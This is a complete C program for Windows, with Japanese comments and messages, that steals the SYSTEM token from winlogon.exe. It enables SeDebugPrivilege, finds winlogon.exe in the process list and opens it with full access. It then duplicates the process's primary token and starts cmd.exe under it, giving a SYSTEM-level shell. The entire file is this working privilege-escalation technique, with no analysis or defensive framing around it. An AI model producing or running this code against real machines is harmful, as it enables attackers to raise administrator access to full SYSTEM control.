#include <stdio.h>
#include <windows.h>
#include <string.h>
#include <TlHelp32.h>


int main() {

    // LookupPrivilegeValue Defining Variables
    LUID luid;

    // OpenProcessToken Defining Variables
    HANDLE hToken;

    // AdjustTokenPrivileges Defining Variables
    TOKEN_PRIVILEGES tp;
    ZeroMemory(&tp, sizeof(tp));
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    // CreateToolhelp32Snapshot Defining Variables
    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(PROCESSENTRY32);


    // OpenProcessToken Defining Variables
    HANDLE hSystemToken;

    // DuplicateTokenEx Defining Variables
    HANDLE hDuplicateSystemToken;

    // CreateProcessWithTokenW Defining Variables
    STARTUPINFOW si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    // get LUID to SeDebugPrivilege

    LookupPrivilegeValueA(
        NULL, // 特権名を取得するシステムの名前
        "SeDebugPrivilege", // privname
        &luid
    );
    
    // add
    tp.Privileges[0].Luid = luid;

    // get curennt user token

    if (OpenProcessToken (
        GetCurrentProcess(), // 現在のプロセスのトークンを取得
        TOKEN_DUPLICATE | TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,  // https://learn.microsoft.com/ja-jp/windows/win32/secauthz/access-rights-for-access-token-objects
        &hToken
    ) == FALSE) {
        printf("OpenProcessToken失敗: %lu\n", GetLastError());
        return 1;
    }
    printf("OpenProcessToken成功\n");


    if (hToken == NULL) {
        printf("失敗\n");
        return 1;
    }
    printf("成功\n");

    // enable SeDebugPrivilege

    BOOL adjresult = AdjustTokenPrivileges (
        hToken,
        FALSE,
        &tp,
        sizeof(tp),
        NULL,
        NULL
    );
    if (adjresult == FALSE) {
    printf("AdjustTokenPrivileges失敗: %lu\n", GetLastError());
    return 1;
}
printf("SeDebugPrivilege有効化成功\n");

    HANDLE hsprocess = CreateToolhelp32Snapshot(
        TH32CS_SNAPPROCESS,
        0
    );
    Process32First(hsprocess,&pe);
    
    do{
        printf("PID: %lu Name: %s\n", pe.th32ProcessID, pe.szExeFile);
        if (strcmp(pe.szExeFile, "winlogon.exe") == 0){
            printf("winlogon.exe");
            break;
        };
    }while(Process32Next(hsprocess, &pe));
    // peが所持している

    HANDLE hProcess = OpenProcess(
        PROCESS_ALL_ACCESS,
        FALSE,
        pe.th32ProcessID
    );
    if (hProcess == NULL) {
    printf("OpenProcess失敗: %lu\n", pe.th32ProcessID);
    return 1;
    }

    if (OpenProcessToken (
        hProcess,
        TOKEN_DUPLICATE|TOKEN_ADJUST_PRIVILEGES,  // https://learn.microsoft.com/ja-jp/windows/win32/secauthz/access-rights-for-access-token-objects
        &hSystemToken
    ) == FALSE ){
        printf("OpenProcessToken失敗: %lu\n", GetLastError());
        return 1;
    };
    printf("OpenProcessToken成功\n");

    if (DuplicateTokenEx (
        hSystemToken,
        MAXIMUM_ALLOWED, // 取得できるすべての権限を取得する
        NULL,
        SecurityImpersonation, // https://learn.microsoft.com/ja-jp/windows/win32/api/winnt/ne-winnt-security_impersonation_level
        TokenPrimary,
        &hDuplicateSystemToken
    ) == FALSE) {
        printf("DuplicateTokenEx失敗: %lu\n", GetLastError());
        return 1;
    }
    printf("DuplicateTokenEx成功\n");

    BOOL result = CreateProcessWithTokenW(
    hDuplicateSystemToken,
    LOGON_WITH_PROFILE,
    NULL,
    L"cmd.exe",
    CREATE_NEW_CONSOLE,
    NULL,
    NULL,
    &si,
    &pi
    );

    if (result == FALSE) {
    printf("失敗: %lu\n", GetLastError());
    return 1;
    }
    printf("成功\n");


    // clean up
    CloseHandle(hToken);
}